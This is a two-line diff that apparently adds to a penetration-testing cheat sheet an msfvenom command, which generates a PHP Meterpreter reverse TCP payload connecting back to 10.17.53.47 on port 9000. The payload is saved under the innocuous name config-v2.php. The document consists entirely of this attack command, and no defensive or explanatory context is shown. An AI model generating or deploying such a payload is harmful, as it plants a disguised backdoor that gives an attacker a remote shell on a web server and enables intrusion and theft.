@@ -1,0 +1,2 @@
+# php reverse_tcp
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.17.53.47 LPORT=9000 -f raw > config-v2.php
